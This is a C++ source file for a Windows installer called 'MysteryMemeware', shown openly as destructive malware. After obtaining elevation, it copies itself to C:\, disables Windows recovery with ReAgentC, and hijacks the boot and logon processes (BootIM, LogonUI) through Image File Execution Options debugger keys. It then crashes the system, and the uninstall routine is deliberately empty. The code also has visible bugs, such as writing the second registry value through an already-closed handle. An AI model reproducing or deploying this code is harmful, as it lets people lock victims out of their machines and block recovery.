// Approved 10/29/2024

#include "MysteryInstaller.h"
#include "EzCpp/EzError.h"
#include "EzCpp/EzHelper.h"
#include "EzCpp/EzTokens.h"
#include <Windows.h>

void MysteryInstaller::Install() {
    DWORD lastError = 0;

    HANDLE currentToken = EzOpenCurrentToken();
    EzEnableAllPrivileges(currentToken);

    BOOL isElevated = EzGetTokenElevation(currentToken);
    EzCloseHandleSafely(currentToken);

    if (!isElevated) {
        if (!EzLaunchWithUAC()) {
            throw EzError(L"The user declined the UAC. MysteryMemeware cannot proceed without elevation.", __FILE__, __LINE__);
        }
        return;
    }

    // Copy current exe to C:\MysteryMemeware.exe
    LPWSTR currentExePath = EzGetCurrentExePathW();

    if(!CopyFileW(currentExePath, L"C:\\MysteryMemeware2.exe", FALSE)){
        EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
    }

    delete[] currentExePath;

    // Run ReAgentC.exe /Disable
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpFile = "ReAgentC.exe";
    sei.lpParameters = "/Disable";
    sei.nShow = SW_HIDE;

    if (!ShellExecuteExA(&sei)) {
        EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
    }

    WaitForSingleObject(sei.hProcess, INFINITE);
    CloseHandle(sei.hProcess);

    // Set BootIM debugger to MysteryMemeware
    LPCWSTR regPath1 = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\BootIM.exe";

    HKEY hKey1 = NULL;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath1, 0, NULL, 0, KEY_WRITE, NULL, &hKey1, NULL) != ERROR_SUCCESS) {
        EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
    }

    LPCWSTR valueName1 = L"Debugger";
    LPCWSTR value1 = L"C:\\MysteryMemeware2.exe /BSOD";
    if (RegSetValueExW(hKey1, valueName1, 0, REG_SZ, reinterpret_cast<const BYTE*>(value1), lstrlenW(value1) * sizeof(WCHAR)) != ERROR_SUCCESS) {
        lastError = GetLastError();
        RegCloseKey(hKey1);
        EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
    }

    if (RegFlushKey(hKey1) != ERROR_SUCCESS) {
        lastError = GetLastError();
        RegCloseKey(hKey1);
        EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
    }

    RegCloseKey(hKey1);

    // Set LogonUI debugger to MysteryMemeware
    LPCWSTR regPath2 = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LogonUI.exe";

    HKEY hKey2 = NULL;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath2, 0, NULL, 0, KEY_WRITE, NULL, &hKey2, NULL) != ERROR_SUCCESS) {
        EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
    }

    LPCWSTR valueName2 = L"Debugger";
    LPCWSTR value2 = L"C:\\MysteryMemeware2.exe";
    if (RegSetValueExW(hKey1, valueName2, 0, REG_SZ, reinterpret_cast<const BYTE*>(value2), lstrlenW(value2) * sizeof(WCHAR)) != ERROR_SUCCESS) {
        lastError = GetLastError();
        RegCloseKey(hKey2);
        EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
    }

    if (RegFlushKey(hKey2) != ERROR_SUCCESS) {
        lastError = GetLastError();
        RegCloseKey(hKey2);
        EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
    }

    RegCloseKey(hKey2);

    // BlueScreen the system
    EzBSOD();
}
void MysteryInstaller::Uninstall() {
    // Welp you're fucked
}